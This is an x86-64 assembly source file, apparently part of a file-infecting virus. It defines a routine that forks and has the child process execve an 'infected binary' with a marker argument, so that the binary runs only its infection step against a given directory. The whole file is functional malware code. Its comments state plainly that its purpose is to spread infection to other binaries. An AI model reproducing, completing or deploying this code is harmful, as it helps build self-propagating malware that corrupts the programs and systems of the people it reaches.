section .text
	global _thread_create
	extern _verif

; here we fork our program, and then execute an infected binary
_thread_create: ;void thread_create(not used, char *directory_to_infect, char *binary_path)
	enter 0, 0
	mov rax, 0
	push rax ; push the NULL pointer at the end of arguments
	push rsi ; push the directory to infect (argv[2])
	lea rax, [rel _verif]
	push rax ; push the code to let the binary know that we need to only run the infection part (argv[1])
	push rdx ; push file path (argv[0])
	mov rax, 57
	syscall ; fork
	cmp rax, 0 ; check the return of fork: 0 is child, other is parent
	jne _parent_ret
; Here we are in the child process
	mov rax, 59 ; execve(char *filename, char *argv[], char *envp)
	mov rdi, QWORD [rsp] ; the file name is the last address we pushed on stack
	mov rsi, rsp ; we have our 3 address on stack, so we just mov our stack pointer for the arguments
	xor rdx, rdx ; we don't need env variables...
	syscall ; then the process is executed

_parent_ret:
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	leave
	ret
